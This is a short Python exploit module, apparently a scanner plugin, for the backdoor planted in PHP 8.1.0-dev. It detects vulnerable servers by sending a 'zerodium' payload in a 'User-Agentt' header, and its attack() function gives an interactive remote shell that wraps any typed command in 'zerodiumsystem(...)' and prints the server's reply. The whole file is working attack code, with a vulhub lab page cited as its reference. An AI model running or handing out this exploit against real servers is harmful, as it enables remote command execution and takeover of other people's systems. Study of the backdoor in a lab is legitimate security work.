import requests, re
import urllib


def verify(url):
    relsult = {
        'name': 'PHP 8.1.0-dev 开发版本后门',
        'vulnerable': False,
        'attack': True,
    }
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        'User-Agentt': 'zerodiumvar_dump(233*233);',
        'Connection': 'close',
    }
    try:
        rep = requests.get(url, headers=headers, timeout=3)
        if re.search('int\(54289\)', rep.text):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['method'] = 'GET'
            relsult['payload'] = headers['User-Agentt']
            relsult['about'] = 'https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md'
            relsult['attack'] = True
        return relsult
    except:
        return relsult

def attack(url):
    try:
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
            'User-Agentt': '',
            'Connection': 'close',
        }
        base_payload = 'zerodiumsystem("{0}");'
        cmd = ''
        while cmd != 'exit':
            vul_headers = headers
            cmd = input('[+] 执行命令:')
            payload = base_payload.format(cmd)
            headers['User-Agentt'] = payload
            rep = requests.get(url, headers=vul_headers, timeout=3)
            print(rep.text)
        return True
    except:
        return False